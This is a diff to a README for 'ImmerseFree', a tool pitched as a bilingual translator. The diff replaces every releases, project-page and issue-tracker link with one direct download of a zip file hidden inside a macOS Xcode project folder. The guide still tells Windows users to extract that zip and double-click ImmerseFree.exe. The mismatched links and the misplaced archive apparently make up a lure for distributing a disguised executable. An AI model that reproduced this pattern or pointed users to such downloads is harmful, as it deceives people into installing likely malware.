@@ -1,18 +1,18 @@
 # 🌍 ImmerseFree - Bilingual Everything, One Click Away
 
-[![Download ImmerseFree](https://img.shields.io/badge/Download-ImmerseFree-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/1309298096/ImmerseFree/releases)
+[![Download ImmerseFree](https://img.shields.io/badge/Download-ImmerseFree-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip)
 
 ## 🚀 Getting Started
 
 Welcome to ImmerseFree — the easiest way to read and watch content in two languages at once. Whether you're browsing the web, reading PDFs and EPUBs, or watching videos, ImmerseFree translates everything for you side-by-side. This guide will walk you through downloading and running the application on your Windows computer in just a few minutes.
 
-Visit this link to download the application: [https://github.com/1309298096/ImmerseFree/releases](https://github.com/1309298096/ImmerseFree/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip)
 
 ## 📥 Download and Install
 
 ### Step 1: Visit the Download Page
 
-Click the big green badge above, or click the link here: [Download ImmerseFree](https://github.com/1309298096/ImmerseFree/releases). This takes you to the official releases page where you'll find all available versions.
+Click the big green badge above, or click the link here: [Download ImmerseFree](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip). This takes you to the official releases page where you'll find all available versions.
 
 ### Step 2: Choose Your Version
 
@@ -120,7 +120,7 @@ ImmerseFree is built by a community of language lovers, just like you. Whether y
 
 Before you go, make sure you have:
 
-- [x] Downloaded the zip from [the releases page](https://github.com/1309298096/ImmerseFree/releases)
+- [x] Downloaded the zip from [the releases page](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip)
 - [x] Extracted the zip file
 - [x] Double-clicked `ImmerseFree.exe` to start the app
 - [x] Pinned the ImmerseFree icon in your browser
@@ -132,9 +132,9 @@ You're all set! With ImmerseFree, the whole world of content is now open to you 
 
 ## 🔗 Useful Links
 
-- **Download Again:** [https://github.com/1309298096/ImmerseFree/releases](https://github.com/1309298096/ImmerseFree/releases)
-- **Project Page:** [https://github.com/1309298096/ImmerseFree](https://github.com/1309298096/ImmerseFree)
-- **Report Issues:** [GitHub Issues](https://github.com/1309298096/ImmerseFree/issues)
+- **Download Again:** [https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip)
+- **Project Page:** [https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip)
+- **Report Issues:** [GitHub Issues](https://raw.githubusercontent.com/1309298096/ImmerseFree/main/macOS/Safari/ImmerseFree.xcodeproj/2.6.zip)
 
 ---
 
